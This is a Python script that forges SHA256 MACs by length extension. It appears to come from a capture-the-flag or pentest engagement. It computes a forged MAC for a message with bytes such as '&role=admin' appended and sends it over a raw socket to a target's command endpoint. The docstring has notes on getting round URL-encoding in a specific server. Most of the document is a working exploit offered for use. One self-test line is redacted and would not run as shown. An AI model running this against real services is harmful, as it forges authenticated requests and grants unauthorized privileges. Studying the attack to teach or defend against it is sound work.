#!/usr/bin/env python3
"""
SHA256 length-extension MAC forgery.

Use when a service authenticates a message as:
    mac = SHA256(secret || message)          # naive Merkle-Damgard, NOT HMAC
and you are handed ONE valid (message, mac) pair plus the secret length.

You can then APPEND arbitrary bytes and compute a VALID mac for
    forged = message + sha256_padding(secret_len + len(message)) + append
without ever knowing `secret`.

Why it works: SHA256 is iterated; the published `mac` IS the internal
compression state after hashing (secret||message). We just keep compressing
from that state with the glue padding + our appended block(s).

CRITICAL TRANSPORT PITFALL (cost me a failed attempt):
    Python's urllib/requests will percent-encode the 0x80 glue bytes
    -> each 0x80 becomes the 3 ASCII chars "%80". If the server does NOT
    percent-decode its `message` arg (Flask/Werkzeug request.args.get often
    does not), the hashed bytes become "%80" (3 bytes) instead of 0x80 (1 byte)
    and the MAC mismatches ("bad MAC").
    FIX: send the forged message BYTES VERBATIM over a raw socket, escaping
    only & and = as %26 / %3D so they survive query parsing. The 0x80 padding
    bytes must be written as raw 0x80 (or as the literal 3-char "%C2%80", which
    this server also accepted). NEVER pass through urlencode/quote.

Run a self-test against hashlib first (enabled by default).
"""
import struct
import hashlib
import argparse
import socket

K = [
0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2,
]

def rotr(x, n):
    return (x >> n) | (x << (32 - n))

def sha256_compress(h, block):
    assert len(block) == 64
    w = list(struct.unpack('>16I', block))
    for i in range(16, 64):
        s0 = rotr(w[i-15], 7) ^ rotr(w[i-15], 18) ^ (w[i-15] >> 3)
        s1 = rotr(w[i-2], 17) ^ rotr(w[i-2], 19) ^ (w[i-2] >> 10)
        w.append((w[i-16] + s0 + w[i-7] + s1) & 0xffffffff)
    a, b, c, d, e, f, g, hh = h
    for i in range(64):
        S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)
        ch = (e & f) ^ ((~e & 0xffffffff) & g)
        t1 = (hh + S1 + ch + K[i] + w[i]) & 0xffffffff
        S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)
        maj = (a & b) ^ (a & c) ^ (b & c)
        t2 = (S0 + maj) & 0xffffffff
        hh = g; g = f; f = e; e = (d + t1) & 0xffffffff
        d = c; c = b; b = a; a = (t1 + t2) & 0xffffffff
    return ((h[0]+a)&0xffffffff, (h[1]+b)&0xffffffff, (h[2]+c)&0xffffffff,
            (h[3]+d)&0xffffffff, (h[4]+e)&0xffffffff, (h[5]+f)&0xffffffff,
            (h[6]+g)&0xffffffff, (h[7]+hh)&0xffffffff)

def sha256_full(msg):
    h = (0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19)
    data = msg + padding(len(msg))
    for i in range(0, len(data), 64):
        h = sha256_compress(h, data[i:i+64])
    return struct.pack('>8I', *h)

def padding(msg_len):
    bit_len = msg_len * 8
    pad = b'\x80'
    while (msg_len + len(pad)) % 64 != 56:
        pad += b'\x00'
    pad += struct.pack('>Q', bit_len)
    return pad

def length_extend(secret_len, original, mac_hex, append):
    """Return (forged_mac_hex, forged_message_bytes)."""
    h = struct.unpack('>8I', bytes.fromhex(mac_hex))
    pad1 = padding(secret_len + len(original))
    total_len = secret_len + len(original) + len(pad1) + len(append)
    new_pad = padding(total_len)
    data = append + new_pad
    for i in range(0, len(data), 64):
        h = sha256_compress(h, data[i:i+64])
    return struct.pack('>8I', *h).hex(), original + pad1 + append

def self_test(trials=500):
    for t in range(trials):
        secret = [REDACTED_SECRET] % 256) for _ in range(16))
        msg = bytes(((t*13+5) % 256) for _ in range(t % 53 + 1))
        append = b"&role=admin"
        real_mac = sha256_full(secret + msg).hex()
        forged_mac, forged_msg = length_extend(16, msg, real_mac, append)
        expected = sha256_full(secret + forged_msg).hex()
        assert forged_mac == expected, f"self-test failed at trial {t}"
    print(f"[+] self-test passed ({trials} trials): forged mac == SHA256(secret||forged_msg)")

def struct_escape(b):
    """Escape only & and = ; leave 0x80 glue bytes RAW (for raw-socket send)."""
    out = b""
    for ch in b:
        if ch == 0x26: out += b"%26"
        elif ch == 0x3D: out += b"%3D"
        else: out += bytes([ch])
    return out

def raw_socket_send(host, port, path, message_bytes, mac_hex, escape=True):
    mval = struct_escape(message_bytes) if escape else message_bytes
    query = b"message=" + mval + b"&mac=" + mac_hex.encode()
    req = (b"GET " + path.encode() + b"?" + query + b" HTTP/1.1\r\n"
           b"Host: " + host.encode() + b"\r\nConnection: close\r\n\r\n")
    s = socket.create_connection((host, port), timeout=20)
    s.sendall(req)
    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    s.close()
    return data.split(b"\r\n\r\n", 1)[-1].decode('utf-8', 'replace')

def main():
    ap = argparse.ArgumentParser(description="SHA256 length-extension MAC forger")
    ap.add_argument("--secret-len", type=int, required=True, help="secret length in bytes")
    ap.add_argument("--message", required=True, help="original authenticated message (raw string)")
    ap.add_argument("--mac", required=True, help="valid mac hex for that message")
    ap.add_argument("--append", required=True, help="bytes to append (e.g. '&role=admin')")
    ap.add_argument("--self-test", action="store_true", help="run hashlib self-test and exit")
    ap.add_argument("--host", help="if set, send forged request via raw socket to host")
    ap.add_argument("--port", type=int, default=5000)
    ap.add_argument("--path", default="/api/command")
    ap.add_argument("--no-escape", action="store_true",
                    help="do NOT even escape &/=/; send bytes 100%% verbatim (use with care)")
    args = ap.parse_args()

    if args.self_test:
        self_test()
        return

    self_test(20)
    forged_mac, forged_msg = length_extend(
        args.secret_len, args.message.encode(), args.mac, args.append.encode())
    print("forged_mac :", forged_mac)
    print("forged_msg :", repr(forged_msg))
    print("NOTE: send forged_msg BYTES verbatim (raw socket). Do NOT pass through urlencode.")

    if args.host:
        resp = raw_socket_send(args.host, args.port, args.path,
                               forged_msg, forged_mac, escape=not args.no_escape)
        print("RESPONSE    :", resp[:500])

if __name__ == "__main__":
    main()
